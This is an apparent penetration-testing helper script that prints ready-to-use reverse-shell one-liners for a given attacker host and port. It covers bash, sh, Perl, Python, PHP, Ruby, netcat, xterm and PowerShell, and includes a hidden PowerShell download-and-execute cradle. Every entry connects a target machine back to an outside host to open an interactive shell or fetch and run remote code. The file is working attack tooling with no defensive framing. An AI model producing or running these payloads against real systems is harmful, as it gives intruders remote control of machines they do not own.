#!/usr/bin/env python
import sys
turtle_tank = {
    'bash_1':{
        'desc':'Generic r-bash shell',
        'cmd':'''bash -i >& /dev/tcp/{0}/{1} 0>&1'''
    },
    'perl_1':{
        'desc':'Perl r-shell',
        'cmd':r"""perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in({1},inet_aton("{0}")))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
    },
    'python2_1':{
        'desc':'Python2 r-shell',
        'cmd':"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
    },
    'python3_1':{
        'desc':'Python3 r-shell',
        'cmd':"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
    },
    'php_1':{
        'desc':'Php r-shell',
        'cmd':"""php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");'"""
    },
    'ruby_1':{
        'desc':'Ruby r-shell',
        'cmd':"""ruby -rsocket -e'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
    },
    'nc_1':{
        'desc':'nc with a -e r-shell',
        'cmd':"""nc -e /bin/sh {0} {1}"""
    },
    'nc_2':{
        'desc':'nc with no -e r-shell',
        'cmd':"""rm /tmp/c;mkfifo /tmp/c;cat /tmp/c|/bin/sh -i 2>&1|nc {0} {1} >/tmp/c"""
    },
    'xterm_2':{
        'desc':'xterm port is 6001 r-shell (auth "xhost +targetip", capture with "Xnest :1"',
        'cmd':"""xterm -display {0}:1"""
    },
    'posh_1':{
        'desc':'PoSh r-shell type 1',
        'cmd':'''powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{0}",{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
    },
    'posh_2':{
        'desc':'PoSh r-shell type 2',
        'cmd':'''powershell.exe -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'''
    },
    'sh_1':{
        'desc':'sh r-shell',
        'cmd':'''0<&196;exec 196<>/dev/tcp/{0}/{1}; sh <&196 >&196 2>&196'''
    },
    'posh_3':{
        'desc':'Posh grab and eval',
        'cmd':'''powershell.exe -w hidden -noni -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://{0}:{1}/<ps1_name>');"'''
    }
    
}


if len(sys.argv) != 3:
    print("USAGE:: ./shellz.py lhost port")
    exit(1)

for turtle in sorted(turtle_tank):
    print("\033[92m### %s\033[0m" % turtle_tank[turtle]['desc'])
    print("%s \n" % turtle_tank[turtle]['cmd'].format(sys.argv[1],sys.argv[2]))